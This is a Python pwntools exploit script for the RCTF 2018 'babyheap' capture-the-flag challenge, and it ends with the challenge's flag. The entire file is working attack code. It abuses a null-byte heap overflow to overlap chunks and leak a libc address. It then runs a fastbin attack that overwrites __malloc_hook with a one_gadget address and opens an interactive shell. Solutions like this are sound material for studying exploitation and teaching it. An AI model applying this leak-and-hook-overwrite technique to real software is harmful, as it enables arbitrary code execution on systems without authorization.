#! /usr/bin/python

from pwn import *

s = process("./babyheap")
#s = process("./babyheap", env={"LD_PRELOAD":"./libc.so.6"})
#s = remote('babyheap.2018.teamrois.cn', 3154)

def print_menu():
    for _ in range(4):
        #print s.recvline()
        s.recvline()
    #print s.recvuntil('choice: ')
    s.recvuntil('choice: ')

def alloc(size, content):
    s.sendline('1')
    s.recvuntil('size: ')
    s.sendline(str(size))
    s.recvuntil('content: ')
    s.sendline(content)
    print_menu()

def show(index):
    s.sendline('2')
    s.recvuntil('index: ')
    s.sendline(str(index))
    result = s.recvline()
    print_menu
    return result

def delete(index):
    s.sendline('3')
    s.recvuntil('index: ')
    s.sendline(str(index))
    print_menu()
    
print_menu()

alloc(0x30,'A' * 0x30)
alloc(0xf0,'A' * 0xf0)
alloc(0x70,'A' * 0x70)
alloc(0xf0,'A' * 0xf0)
alloc(0x30,'A' * 0x30)

delete(1)
delete(2)

alloc(0x78,'B' * 0x60 + p64(0) + p64(0x110) + p64(0x180))   # new chunk1
#alloc(0x78, 'B' * 0x70 + p64(0x180))

# chunk0 AAAAAA...
# chunk1 BBBBBB...
# chunk2 <no such chunk>
# chunk3 AAAAAA...
# chunk4 AAAAAA...


delete(3)

# chunk0 AAAAAA...
# chunk1 BBBBBB...
# chunk2 <no such chunk>
# chunk3 <no such chunk>
# chunk4 AAAAAA...


alloc(0xf0, 'C' * 0xf0)

# chunk0 AAAAAA...
# chunk1 x\x1b\xfe\xfe\xff\x7f
# chunk2 CCCCCC...
# chunk3 <no such chunk>
# chunk4 AAAAAA...

                                 
#leak
leak = show(1)[9:-1:]
leak = u64(leak + '\x00\x00')
#print 'leak =', hex(leak)  #0x7ffff7dd1b78
#libc : 0x7ffff7a0d000
#offset = 0x7ffff7dd1b78 - 0x7ffff7a0d000 = 0x3C4B78
libc_addr = leak - 0x3C4B78 
log.info('libc_addr = ' + hex(libc_addr))
__malloc_hook_offset = 0x3c4b10
__malloc_hook_addr = libc_addr + __malloc_hook_offset
one_gadget_offset = 0x4526a
one_gadget_addr = libc_addr + one_gadget_offset
hook = __malloc_hook_addr - 0x23 # 3C4AED
log.info('libc_addr = ' + hex(libc_addr))
log.info('__malloc_hook_addr = ' + hex(__malloc_hook_addr))
log.info('one_gadget_addr = ' + hex(one_gadget_addr))

delete(2)

# chunk0 AAAAAA...
# chunk1 x\x1b\xfe\xfe\xff\x7f
# chunk2 <no such chunk>
# chunk3 <no such chunk>
# chunk4 AAAAAA...


alloc(0x80, 'a' * 0x80)

# chunk0 AAAAAA...
# chunk1 x\x1b\xfe\xfe\xff\x7f
# chunk2 aaaaaa...
# chunk3 <no such chunk>
# chunk4 AAAAAA...


alloc(0x80, 'b' * 0x60 + p64(0) + p64(0x71) + p64(0) + p64(0))

# chunk0 AAAAAA...
# chunk1 
# chunk2 aaaaaa...
# chunk3 bbbbbb...
# chunk4 AAAAAA...


delete(1)

# chunk0 AAAAAA...
# chunk1 <no such chunk>
# chunk2 aaaaaa...
# chunk3 bbbbbb...
# chunk4 AAAAAA...


delete(3)

# chunk0 AAAAAA...
# chunk1 <no such chunk>
# chunk2 aaaaaa...
# chunk3 <no such chunk>
# chunk4 AAAAAA...


alloc(0x80, 'c' * 0x60 + p64(0) + p64(0x70) + p64(hook) + p64(0))

# chunk0 AAAAAA...
# chunk1 cccccc...
# chunk2 aaaaaa...
# chunk3 <no such chunk>
# chunk4 AAAAAA...


alloc(0x60,'d' * 0x60)

# chunk0 AAAAAA...
# chunk1 cccccc...
# chunk2 aaaaaa...
# chunk3 dddddd...
# chunk4 AAAAAA...


alloc(0x60,'e' * 0x13 + p64(one_gadget_addr))

# chunk0 AAAAAA...
# chunk1 cccccc...
# chunk2 aaaaaa...
# chunk3 dddddd...
# chunk4 AAAAAA...
# chunk5 eeeeeeeeeeeeeeeeeeej"\xa5\xef\xef


#gdb.attach(s)

s.sendline('1')
s.recvuntil('size: ')
s.sendline('1')


s.interactive()

#RCTF{Let_us_w4rm_up_with_a_e4sy_NU11_byte_overflow_lul_7adf58}




















